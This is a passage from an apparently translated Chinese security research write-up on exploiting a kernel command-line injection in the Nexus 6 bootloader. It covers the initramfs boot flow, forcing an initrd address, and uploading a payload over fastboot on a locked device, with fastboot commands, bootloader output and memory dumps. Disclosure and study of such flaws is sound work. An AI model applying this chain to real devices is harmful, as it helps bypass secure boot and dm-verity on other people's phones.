    {
    phys_initrd_start = start;
    phys_initrd_size = end - start;
    }
phys_initrd_start定位物理内存地址，这片物理内存会通过如下代码映射到虚拟地址空间中：
    void __init arm_memblock_init(struct meminfo *mi, struct machine_desc *mdesc)
    {
    [...]
    if (phys_initrd_size) {
    memblock_reserve(phys_initrd_start, phys_initrd_size);
    /* Now convert initrd to virtual addresses */
    initrd_start = __phys_to_virt(phys_initrd_start);
    initrd_end = initrd_start + phys_initrd_size;
    }
    [...]
    }
接下来，initramfs会被解压到rootfs中：
    static int __init populate_initramfs(void)
    {
    [...]
       if (initrd_start) {
    #ifdef CONFIG_BLK_DEV_RAM
    int fd;    
    err = unpack_to_initramfs((char *)initrd_start,
    initrd_end - initrd_start);
    if (!err) {
    free_initrd();
    goto done;
    } else {
    clean_initramfs();
    unpack_to_initramfs(__initramfs_start, __initramfs_size);
    }
    [...]
       }
       return 0;
    }
    initramfs_initcall(populate_initramfs);
最后kernel_init函数会被调用，该函数会执行用户空间中的第一个进程：/init。
    static int __ref kernel_init(void *unused)
    {
    [...]
    if (ramdisk_execute_command) {
    if (!run_init_process(ramdisk_execute_command))
    return 0;
    pr_err("Failed to execute %sn", ramdisk_execute_command);
    }
    [...]
    }
注：ramdisk_execute_command的默认值为/init。
**七、用户空间的初始化以及dm-verity**
init负责带动整个用户空间。该程序的职责之一就是设置SELinux（负责加载策略等）。一旦策略加载完毕，init会位于kernel域中，但SELinux初始化完成后不久，该进程就会转移到init域中。请注意，对于发布版系统而言，即便内核没有使用强制（enforcing）模式下的SELinux进行加载（比如，我们可以在内核命令行中使用androidboot.selinux=permissive参数实现这一点），init还是会重新设置enforce模式：
    static void selinux_initialize(bool in_kernel_domain) {
    [...]
        if (in_kernel_domain) {
            INFO("Loading SELinux policy...n");
    [...]
            bool kernel_enforcing = (security_getenforce() == 1);
            bool is_enforcing = selinux_is_enforcing();
            if (kernel_enforcing != is_enforcing) {
                if (security_setenforce(is_enforcing)) {
                    ERROR("security_setenforce(%s) failed: %sn",
                          is_enforcing ? "true" : "false", strerror(errno));
                    security_failure();
                }
            }
    [...]
        }
    }
注：发布版系统中，selinux_is_enforce()始终返回true。
init也会触发分区挂载动作。dm-verity稍后会使用存放在initramfs目录（/verity_key）中的某个公钥来验证相关分区（比如system分区）的完整性，这样一来，某个不受信任的initramfs就意味着某个不受信任的system分区。
那么，已知内核命令行存在注入漏洞，攻击者如何利用这个漏洞干扰上述的启动过程呢？
**八、失败的尝试：控制ramdisk_execute_command**
事实证明，有一个内核命令行参数（rdinit）会覆盖/init，也就是ramdisk_execute_command的默认值：
    static int __init rdinit_setup(char *str)
    {
    unsigned int i;
    ramdisk_execute_command = str;
    /* See "auto" comment in init_setup */
    for (i = 1; i 
    (bootloader)   
    (bootloader)     a initrd=0x33333333,1024
    (bootloader)   
    (bootloader)   
    (bootloader)     FSG IDs, see http://goo.gl/gPmhU
    (bootloader)   
    (bootloader) 
    OKAY [  0.016s]
    finished. total time: 0.016s
    $ fastboot continue
内核的确崩溃了！
这类攻击的原理类似于在内存损坏漏洞中所使用的控制指令指针（IP寄存器，IP代表Instruction
Point）或者程序计数器（PC寄存器，PC代表Program
Counter）的原理，因此当前最紧要的第一步，就是利用fastboot，将经过我们修改的initramfs存档加载到设备内存中。
需要注意的是，Linux内核不会重新检查initramfs的真实性，它依赖bootloader来完成这一任务，因此如果我们设法将修改过的initramfs存放到可控的phys_initrd_start物理地址上，内核的确会将其填充到rootfs中。
**十、通过USB将任意数据载入内存中**
ABOOT的fastboot提供了一个使用USB进行下载的机制，该机制支持固件刷写（flashing）功能。在锁定的bootloader中，下载功能依然可以使用，因此攻击者可以使用这个功能将被修改过的initramfs载入设备。我们唯一的希望就是，在initramfs被填充到rootfs之前，bootloader和内核不会将这些数据填充为0或者覆盖这些数据。为了验证这一点，我们做了如下实验。首先，我们安装了自定义的msm-shamu内核，该内核具备LKM（Loadable-Kernel
Modules，可加载内核模块）功能。然后，我们通过fastboot将一大段数据（0123456789ABCDEFALEFALEFALEF…）上传到设备中：
    $ fastboot flash aleph payload.bin
    [...]
    target reported max download size of 536870912 bytes
    sending 'aleph' (524288 KB)...
    OKAY [ 62.610s]
    writing 'aleph'...
    (bootloader) Not allowed in LOCKED state!
    FAILED (remote failure)
    finished. total time: 62.630s
请注意，出现错误信息是因为我们试图刷写固件，然而设备的确下载了这些数据。
我们通过fastboot continue启动了平台，然后使用[LiME
LKM](https://github.com/504ensicsLabs/LiME)工具将整个物理内存导出，从中搜寻我们上传的数据。
    10FFFFC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    10FFFFD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    10FFFFE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    10FFFFF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    11000000  30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46  0123456789ABCDEF
    11000010  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
    11000020  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
    11000030  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
    11000040  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
    11000050  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
因此我们知道，即使平台已经加载并运行起来，我们的载荷也能存活下来。我们多次重复了这个过程，没有任何差错出现，载荷始终加载到0x11000000这个地址，并且Linux内核总是可以使用这个地址。
出于好奇心，我们也使用静态分析方式验证了这个结果。事实证明，Nexus 6所使用的小型内核（Little
Kernel，LK）中，SCRATCH_ADDR指向了一块内存区域，下载的数据正是保存在这片区域中。我们使用IDA加载ABOOT程序，进一步确认了这个结果（为了便于阅读，我们重命名了函数）：
    int fastboot_mode()
    {
    [...]
      dprintf(1, "Entering fastboot moden");